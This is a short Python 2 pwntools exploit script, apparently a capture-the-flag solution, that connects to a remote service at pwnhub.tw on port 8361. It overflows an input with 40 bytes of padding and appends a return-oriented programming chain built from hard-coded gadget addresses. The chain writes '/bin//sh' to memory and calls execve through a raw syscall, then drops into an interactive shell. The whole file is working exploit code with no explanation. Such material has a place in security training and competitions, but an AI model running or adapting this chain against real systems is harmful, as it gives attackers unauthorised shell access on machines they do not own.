#!/usr/bin/env python2
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['terminator', '-x', 'bash', '-c']

r = remote("pwnhub.tw", 8361)

buf = 0x6c9a20
mov_rdi_rdx = 0x4353e3
pop_rax_rdx_rbx = 0x478516
pop_rsi = 0x401577
pop_rdi = 0x401456
pop_rdx = 0x4427e6
syscall = 0x40037a

rop = flat([pop_rdi, buf, pop_rdx, "/bin//sh", mov_rdi_rdx])
rop += flat([pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, buf, pop_rsi, 0, syscall])

r.recvuntil(":")
payload = "a"*40
payload += rop

print len(payload)
r.sendline(payload)

r.interactive()
